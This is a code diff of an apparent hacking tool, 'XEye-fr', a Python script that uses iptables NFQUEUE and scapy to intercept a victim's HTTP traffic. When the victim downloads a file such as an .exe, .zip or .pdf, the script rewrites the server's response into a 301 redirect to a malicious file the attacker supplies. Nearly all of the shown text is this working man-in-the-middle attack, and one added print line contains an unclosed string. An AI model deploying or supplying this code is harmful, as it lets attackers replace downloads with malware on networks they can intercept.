@@ -51,36 +51,44 @@ print("[XEye YT Channel] --> https://www.youtube.com/xeyecs")
 print("***********************************************************************************************")
 time.sleep(1)
 linktf = input("[Required] --> Please enter or paste the link to the malicious file: ")
-print("\n\n\n[Waiting] --> Waiting for a file to be replaced .......")
-def packeting(packets):
-    packs = sc.IP(packets.get_payload())
-    if packs.haslayer(sc.Raw) and packs.haslayer(sc.TCP):
-        if packs[sc.TCP].dport == 80:
-            #print("HTTP Request -------")
-            lraw = str(packs[sc.Raw].load)
-            if ".exe" in lraw or ".zip" in lraw or ".rar" in lraw or ".pptx" in lraw or ".pdf" in lraw or "xls" in lraw or "png" in lraw or "jpg" in lraw:
-                ackaseq.append(packs[sc.TCP].ack)
-                print("[Gongrats] --> Target is about to download a file ......")
-                time.sleep(1)
-                #print("[Attempt] --> Now trying to replace the file ......")
-                #packs.show()
-        elif packs[sc.TCP].sport == 80:
-            #print("HTTP Response -------")
-            if packs[sc.TCP].seq in ackaseq:
-                if "200 OK" in str(packs[sc.Raw].load):
-                    ackaseq.remove(packs[sc.TCP].seq)
-                    print("[Attempt] --> Replacing the download link with \""+linktf+"\" .....")
-                    secline = "\n"
-                    packs[sc.Raw].load = str("HTTP/1.1 301 Moved Permanently\nLocation: "+linktf+"\n\n")
+print("[Info] --> Configuring your Iptables for compatibility")
+try:
+    subprocess.call("sudo iptables -I FORWARD -j NFQUEUE --queue-num 3",shell=True)
+    print("[Waiting] --> Waiting for a file to be replaced .......")
+    def packeting(packets):
+        packs = sc.IP(packets.get_payload())
+        if packs.haslayer(sc.Raw) and packs.haslayer(sc.TCP):
+            if packs[sc.TCP].dport == 80:
+                #print("HTTP Request -------")
+                lraw = str(packs[sc.Raw].load)
+                if ".exe" in lraw or ".zip" in lraw or ".rar" in lraw or ".pptx" in lraw or ".pdf" in lraw or "xls" in lraw or "png" in lraw or "jpg" in lraw:
+                    ackaseq.append(packs[sc.TCP].ack)
+                    print("[Gongrats] --> Target is about to download a file ......")
+                    time.sleep(1)
+                    #print("[Attempt] --> Now trying to replace the file ......")
                     #packs.show()
-                    del packs[sc.IP].len
-                    del packs[sc.IP].chksum
-                    del packs[sc.TCP].chksum
-                    packets.set_payload(bytes(packs))
+            elif packs[sc.TCP].sport == 80:
+                #print("HTTP Response -------")
+                if packs[sc.TCP].seq in ackaseq:
+                    if "200 OK" in str(packs[sc.Raw].load):
+                        ackaseq.remove(packs[sc.TCP].seq)
+                        print("[Attempt] --> Replacing the download link with \""+linktf+"\" .....")
+                        secline = "\n"
+                        packs[sc.Raw].load = str("HTTP/1.1 301 Moved Permanently\nLocation: "+linktf+"\n\n")
+                        #packs.show()
+                        del packs[sc.IP].len
+                        del packs[sc.IP].chksum
+                        del packs[sc.TCP].chksum
+                        packets.set_payload(bytes(packs))
 
 
-    packets.accept()
+        packets.accept()
 
-nfque = netf.NetfilterQueue()
-nfque.bind(0,packeting)
-nfque.run()
+    nfque = netf.NetfilterQueue()
+    nfque.bind(3,packeting)
+    nfque.run()
+except:
+    print("[Restoring] --> Removing the forward rule...)
+    subprocess.call("sudo iptables -D FORWARD -j NFQUEUE --queue-num 3",shell=True)
+    time.sleep(1)
+    print("[❤] --> Thanks for using XEye-fr")
